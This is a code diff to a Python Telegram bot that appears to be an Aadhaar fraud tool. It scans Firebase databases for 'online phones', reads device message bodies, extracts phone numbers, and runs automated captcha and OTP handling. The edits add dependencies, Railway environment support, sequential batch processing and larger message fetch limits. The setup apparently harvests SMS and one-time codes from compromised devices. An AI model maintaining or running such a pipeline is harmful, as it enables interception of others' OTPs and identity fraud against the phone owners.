@@ -14,7 +14,9 @@ REQUIRED_MODULES = {
     "ddddocr": "ddddocr",
     "fitz": "pymupdf",
     "phonenumbers": "phonenumbers",
-    "aiohttp": "aiohttp"
+    "aiohttp": "aiohttp",
+    "PIL": "Pillow",
+    "PyPDF2": "PyPDF2"
 }
 
 REQUIRED_FILES = {
@@ -78,7 +80,13 @@ def check_startup_requirements():
         print("  🟢 TELEGRAM_BOT_TOKEN      -> CONFIGURED" if token_found else "  🔴 TELEGRAM_BOT_TOKEN      -> MISSING")
         print("  🟢 ADMIN_IDS               -> CONFIGURED" if admin_found else "  🟡 ADMIN_IDS               -> WARNING")
     else:
-        print("  🔴 .env Configuration File -> MISSING")
+        # Railway-style: env vars set via dashboard, not .env file
+        print("  🟡 .env not found — checking process environment (Railway style)")
+        if os.getenv('TELEGRAM_BOT_TOKEN'):
+            print("  🟢 TELEGRAM_BOT_TOKEN      -> CONFIGURED (from env)")
+            token_found = True
+        else:
+            print("  🔴 TELEGRAM_BOT_TOKEN      -> MISSING")
 
     print("\n🌐 Verifying Proxy Configuration:")
     print("------------------------------------------------------------")
@@ -95,7 +103,7 @@ def check_startup_requirements():
 
     print("============================================================\n")
 
-    has_errors = (len(missing_packages) > 0 or len(missing_files) > 0 or not env_exists or not token_found)
+    has_errors = (len(missing_packages) > 0 or len(missing_files) > 0 or not token_found)
     if has_errors:
         print("❌ STARTUP ERROR: Critical requirements are missing!")
         if len(missing_packages) > 0:
@@ -103,8 +111,8 @@ def check_startup_requirements():
         if len(missing_files) > 0:
             for f in missing_files:
                 print(f"   Missing: {f}")
-        if not env_exists or not token_found:
-            print("👉 Create .env with TELEGRAM_BOT_TOKEN and ADMIN_IDS")
+        if not token_found:
+            print("👉 Set TELEGRAM_BOT_TOKEN (via .env or Railway variables)")
         sys.exit(1)
     else:
         print("✨ All requirements met! Starting Aadhaar Telegram Bot...\n")
@@ -1037,15 +1045,14 @@ def cmd_listfire(message):
 
 
 # ==============================================================================
-# 🚀 AUTO PIPELINE — THE MAIN ONE-CLICK COMMAND
+# 🚀 AUTO PIPELINE — MAIN COMMAND
 # ==============================================================================
 
 @bot.message_handler(commands=['auto'])
 def cmd_auto(message):
     """
-    /auto [N] — Full automated pipeline.
-    Scans ALL Firebase links, detects every online phone, processes up to N (or all)
-    in parallel (5 concurrent), with automatic captcha + OTP handling + 3 retries.
+    /auto [N] — Full automated pipeline (strictly sequential, 1 phone at a time).
+    Scans ALL Firebase links, detects every online phone, processes up to N (or all).
     """
     chat_id = message.chat.id
     if chat_id not in ADMIN_IDS:
@@ -1057,19 +1064,16 @@ def cmd_auto(message):
         bot.send_message(chat_id, "📭 No Firebase links configured. Use <code>/addfire URL</code> first.", parse_mode='HTML')
         return
 
-    # Parse optional count
     parts = message.text.split(maxsplit=1)
-    max_phones = None  # None = process ALL detected phones
+    max_phones = None
     if len(parts) > 1 and parts[1].strip().isdigit():
         max_phones = int(parts[1].strip())
         if max_phones <= 0:
             max_phones = None
 
-    # Enable global auto-otp state (allows /stopauto to work too)
     aadhaar_engine.auto_otp_state["enabled"] = True
     aadhaar_engine.auto_otp_state["chat_id"] = chat_id
 
-    # Launch the pipeline on the global loop
     launched = aadhaar_engine.start_auto_batch(bot, chat_id, max_phones)
     if not launched:
         bot.send_message(chat_id,
@@ -1079,7 +1083,7 @@ def cmd_auto(message):
 
 @bot.message_handler(commands=['runall', 'batch'])
 def cmd_runall(message):
-    """Alias of /auto — kept for compatibility."""
+    """Alias of /auto."""
     cmd_auto(message)
 
 
@@ -1095,7 +1099,7 @@ def cmd_stopauto(message):
     aadhaar_engine.auto_otp_state["target_mobile"] = None
     bot.send_message(
         chat_id,
-        "🛑 <b>Auto-OTP state disabled.</b>\nNote: any running /auto batch will finish its current phones." if was else "ℹ️ Auto-OTP was already off.",
+        "🛑 <b>Auto-OTP state disabled.</b>\nRunning batch will finish current phones." if was else "ℹ️ Auto-OTP was already off.",
         parse_mode='HTML'
     )
 
@@ -1116,7 +1120,7 @@ def cmd_resetused(message):
 
 
 # ==============================================================================
-# 📱 SCAN — Preview all online phones
+# 📱 SCAN COMMAND
 # ==============================================================================
 
 @bot.message_handler(commands=['scan'])
@@ -1210,7 +1214,7 @@ def cmd_debugscan(message):
                     with_phones = 0
                     sample = []
                     for cid in online[:10]:
-                        msgs = await aadhaar_engine.firebase_get_device_messages(session, url, cid, limit=5)
+                        msgs = await aadhaar_engine.firebase_get_device_messages(session, url, cid, limit=30)
                         phone = aadhaar_engine.firebase_extract_phone(msgs) if msgs else None
                         if phone:
                             with_phones += 1
@@ -1300,11 +1304,11 @@ def cmd_debugmsgs(message):
                     if target_phone and phone != target_phone:
                         continue
                     lines.append(f"\n  📱 <b>{phone}</b>")
-                    msgs = await aadhaar_engine.firebase_get_device_messages(session, url, cid, limit=5)
+                    msgs = await aadhaar_engine.firebase_get_device_messages(session, url, cid, limit=30)
                     if not msgs:
                         lines.append("     (no messages)")
                         continue
-                    for _, val in list(msgs.items())[-5:]:
+                    for _, val in list(msgs.items())[-10:]:
                         if isinstance(val, dict):
                             body = val.get("body") or val.get("message") or str(val)
                         else:
